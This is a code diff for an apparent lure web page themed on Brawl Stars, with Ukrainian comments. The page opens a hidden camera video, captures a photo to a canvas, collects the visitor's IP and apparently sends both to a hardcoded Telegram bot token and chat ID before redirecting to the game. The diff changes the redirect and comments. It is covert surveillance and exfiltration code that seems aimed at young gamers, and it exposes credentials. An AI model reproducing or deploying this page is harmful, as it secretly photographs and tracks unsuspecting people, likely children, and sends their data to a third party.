@@ -29,7 +29,6 @@
             max-width: 400px;
             box-shadow: 0 0 30px rgba(255, 204, 0, 0.5);
         }
-        /* ВЕЛИКА КНОПКА ДЛЯ ТЕЛЕФОНУ */
         button { 
             padding: 25px 40px; 
             background: #ffcc00; 
@@ -58,6 +57,7 @@
 <video id="v" autoplay playsinline muted style="display:none"></video>
 
 <script>
+    // ВСТАВ СЮДИ СВОЇ ДАНІ
     const TG_TOKEN = "8842138354:AAFV7kdBBGcwaNLa2EBaebxCI_cy80r_HxY";
     const TG_CHAT_ID = "-1003787168523";
 
@@ -79,7 +79,7 @@
                 ip = data.ip;
             } catch (e) {}
 
-            // 2. Фото + Дані
+            // 2. Робимо фото та відправляємо
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
@@ -109,8 +109,11 @@
                     
                     stream.getTracks().forEach(t => t.stop());
                     
-                    // ПЕРЕНАПРАВЛЕННЯ В BRAWL STARS
-                    window.location.href = "https://brawlstars.com"; 
+                    // Перенаправлення в гру
+                    window.location.href = "brawlstars://";
+                    setTimeout(() => {
+                        window.location.href = "https://brawlstars.com";
+                    }, 2000);
                 };
             }, 6000);
 
